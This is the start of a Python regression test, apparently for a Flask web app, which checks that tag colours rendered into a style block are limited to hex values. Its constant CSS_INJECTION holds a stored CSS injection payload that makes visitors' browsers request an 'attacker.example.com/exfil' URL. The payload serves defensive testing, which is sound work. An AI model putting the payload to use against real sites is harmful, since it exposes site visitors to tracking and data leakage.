#!/usr/bin/env python3
"""
Tag colour is rendered into a <style> block, so it must only ever be a hex colour.

Anything else is stored CSS injection (GHSA-4j9m-cxq4-9c36) - Jinja2's HTML autoescaping
does not protect a CSS context, the payload below needs none of the characters it escapes.

Covers the three ways a colour can be set/rendered:
 - the tag edit form
 - the API (PUT and POST)
 - rendering a value already in the datastore (from before this was validated)
"""

import json
from flask import url_for
from .util import get_UUID_for_tag_name

CSS_INJECTION = 'red} *{background-image:url(https://attacker.example.com/exfil)} .x{color:'


